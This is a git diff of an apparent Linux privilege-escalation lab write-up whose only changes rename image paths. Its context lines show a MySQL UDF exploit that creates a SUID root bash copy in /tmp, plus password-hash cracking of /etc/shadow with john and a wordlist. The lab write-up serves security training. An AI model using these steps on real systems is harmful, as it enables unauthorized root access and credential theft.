@@ -17,7 +17,7 @@ description: >-
 **using nmap** \
 
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>open ports</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>open ports</p></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```bash
@@ -39,7 +39,7 @@ A user-defined function (UDF) is a [function](https://en.wikipedia.org/wiki/Func
 mysql -u root
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```sql
 use mysql;
@@ -53,7 +53,7 @@ create function do_system returns integer soname 'raptor_udf2.so';
 
 BLOB, which stands for a **Binary Large Object**, is a MySQL data type that can store images, PDF files, multimedia, and other types of binary data.
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
 
@@ -62,7 +62,7 @@ select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
 /tmp/rootbash -p
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>SERVICE EXPLOIT</p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>SERVICE EXPLOIT</p></figcaption></figure>
 
 ### Weak File Permissions - Readable /etc/shadow
 
@@ -77,7 +77,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 {% endcode %}
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What hashing algorithm was used to produce the root user's password hash?**
 
@@ -85,7 +85,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 cat hash | hashid
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>SHA-512  Crypt</strong></p></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><strong>SHA-512  Crypt</strong></p></figcaption></figure>
 
 ### Weak File Permissions - Writable /etc/shadow
 
